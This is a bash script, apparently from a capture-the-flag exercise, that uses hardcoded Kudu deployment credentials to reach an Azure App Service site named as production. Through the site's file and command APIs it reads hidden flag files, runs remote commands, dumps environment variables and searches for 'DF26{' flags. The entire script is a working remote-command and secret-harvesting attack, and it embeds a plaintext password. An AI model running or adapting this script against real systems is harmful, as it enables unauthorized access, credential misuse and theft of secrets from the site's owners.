#!/usr/bin/env bash
set -uo pipefail

echo "=== BUILD56: READ FLAG FILES VIA KUDU ==="

KUDU_USER='$app-tbl-reporting-prod'
KUDU_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
KUDU_BASE='https://app-tbl-reporting-prod.scm.azurewebsites.net'

echo "=== .flag.out ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  "$KUDU_BASE/api/vfs/site/wwwroot/.flag.out"

echo ""
echo "=== .flag.py ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  "$KUDU_BASE/api/vfs/site/wwwroot/.flag.py"

echo ""
echo "=== .zq.out ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  "$KUDU_BASE/api/vfs/site/wwwroot/.zq.out"

echo ""
echo "=== .zq.sh ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  "$KUDU_BASE/api/vfs/site/wwwroot/.zq.sh"

echo ""
echo "=== KUDU CMD - env vars ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  -X POST -H "Content-Type: application/json" \
  -d '{"command":"env","dir":"/home/site/wwwroot"}' \
  "$KUDU_BASE/api/command" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Output','')[:3000])"

echo ""
echo "=== KUDU CMD - list files ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  -X POST -H "Content-Type: application/json" \
  -d '{"command":"ls -la /home/site/wwwroot/","dir":"/home/site/wwwroot"}' \
  "$KUDU_BASE/api/command" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Output','')[:2000])"

echo ""
echo "=== KUDU CMD - cat flag files ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  -X POST -H "Content-Type: application/json" \
  -d '{"command":"cat /home/site/wwwroot/.flag.out /home/site/wwwroot/.flag.py","dir":"/home/site/wwwroot"}' \
  "$KUDU_BASE/api/command" | python3 -c "import sys,json; d=json.load(sys.stdin); print('OUT:', d.get('Output','')[:5000]); print('ERR:', d.get('Error','')[:500])"

echo ""
echo "=== KUDU CMD - find flag ==="
curl -s -m 30 -u "$KUDU_USER:$KUDU_PASS" \
  -X POST -H "Content-Type: application/json" \
  -d '{"command":"find /home -name \"*flag*\" 2>/dev/null; grep -r \"DF26{\" /home/site/wwwroot/ 2>/dev/null | head -20","dir":"/home/site/wwwroot"}' \
  "$KUDU_BASE/api/command" | python3 -c "import sys,json; d=json.load(sys.stdin); print('OUT:', d.get('Output','')[:3000]); print('ERR:', d.get('Error','')[:300])"

echo "BUILD56 DONE"
